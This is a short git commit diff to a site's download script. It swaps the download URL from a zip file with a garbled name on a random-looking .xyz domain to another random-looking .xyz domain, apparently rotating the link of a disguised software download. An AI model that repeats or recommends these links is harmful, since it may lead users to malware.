3713361f235084807f855baf04b9d3e176e3f975
z168188 <lyuelinm54@gmail.com>
2025-09-06 17:21:07 +0800

    Update filename.js

--- assets/download/filename.js
+++ assets/download/filename.js
@@ -1,6 +1,7 @@
 (function() {
-    window['filename'] = 'https://risanhs-sdad1e4asd-3css3hub.xyz/Vicce_x64_win7-11_Quioaydiiek_v412001.23.zip';
+    window['filename'] = 'https://xhshuxcoslemz.xyz/';
 })();
+
 
 
 
